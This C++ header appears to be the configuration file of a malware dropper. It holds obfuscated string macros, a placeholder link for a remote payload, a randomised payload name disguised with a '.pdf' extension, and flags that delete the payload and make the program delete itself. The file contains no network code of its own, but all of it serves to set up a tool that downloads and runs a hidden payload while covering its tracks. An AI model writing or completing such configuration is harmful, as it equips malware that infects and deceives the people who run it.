#pragma once
#include "obfuscation.h"

#define PAYLOAD_LINK OBF(wchar_t, L"PUT PAYLOAD LINK HERE!")
#define PAYLOAD_NAME OBF(wchar_t, L"This can be ignored if randompayloadname is set to true")
#define PAYLOAD_FILE_EXTENSION OBF(wchar_t, L".pdf")

namespace config
{
	constexpr inline bool randompayloadname = true;

	constexpr inline bool deletepayload = true;
	constexpr inline bool selfedelete = true;
};